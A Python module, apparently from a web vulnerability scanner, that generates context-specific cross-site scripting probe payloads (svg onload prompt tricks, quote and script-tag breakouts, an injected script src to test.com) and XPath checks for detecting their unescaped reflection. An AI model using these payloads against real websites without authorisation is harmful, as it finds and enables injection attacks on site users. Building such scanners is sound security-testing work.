from __future__ import absolute_import, unicode_literals

def payload_generator(context):
    payloads = []
    if context == 'attribname':
        payloads = []
        comb = {}

        # check for escaping < >
        comb['payload'] = "\"><svg onload=prompt`812132`>"
        comb['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(comb)
        comb = {}

        # check for adding new attribute with space
        comb['payload'] = " onload=prompt`812132` "
        comb['find'] = "//*[@onload[contains(.,812132)]]"
        payloads.append(comb)

    if context == 'attribval':
        payloads = []
        comb = {}

        # check for escaping < >
        comb['payload'] = "\"><svg onload=prompt`812132`>"
        comb['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(comb)
        comb = {}

        # check for escaping using ' and "
        comb['payload'] = "'\" onload=prompt`812132` "
        comb['find'] = "//*[@onload[contains(.,812132)]]"
        payloads.append(comb)

    if context == 'htmltag':
        payloads = []
        comb = {}
        # check for > <
        comb['payload'] = "<svg onload=prompt`812132`>"
        comb['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(comb)

    if context == 'comment':
        payloads = []
        comb = {}
        # check for escaping comment
        comb['payload'] = "––><svg onload=prompt`812132`>"
        comb['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(comb)

    if context == 'jssinglequote':
        payloads = []
        comb = {}
        # check for escaping < >
        comb['payload'] = "</script><svg onload=prompt`812132`>"
        comb['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(comb)
        comb = {}

        # check for escaping using ' and "
        comb['payload'] = "'); prompt`812132`;//"
        comb['find'] = '//script[contains(text(),\'' + comb['payload'] + '\')]'
        payloads.append(comb)

    if context == "jsnode":
        payloads = []
        comb = {}
        comb['payload'] = "\" src=\"https://test.com\" \""
        comb['find'] = "//script[@src[contains(.,https://test.com)]]"
        payloads.append(comb)

    if context == 'jsdoublequote':
        payloads = []
        comb = {}
        # check for escaping < >
        comb['payload'] = "</script><svg onload=prompt`812132`>"
        comb['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(comb)
        comb = {}

        # check for escaping using ' and "
        comb['payload'] = "\")-prompt`812132`-//"
        comb['find'] = '//script[contains(text(),\'' + comb['payload'] + '\')]'
        payloads.append(comb)

    if context == 'onattrib':
        payloads = []
        comb = {}
        # check for escaping < >
        comb['payload'] = "\"><svg onload=prompt`812132`>"
        comb['find'] = "//svg[@onload[contains(.,812132)]]"
        payloads.append(comb)
        comb = {}

        # check for escaping using ' and "
        comb['payload'] = "\"prompt`812132`"
        comb['find'] = '//*[@*[contains(.,812132)]]'
        payloads.append(comb)

    return payloads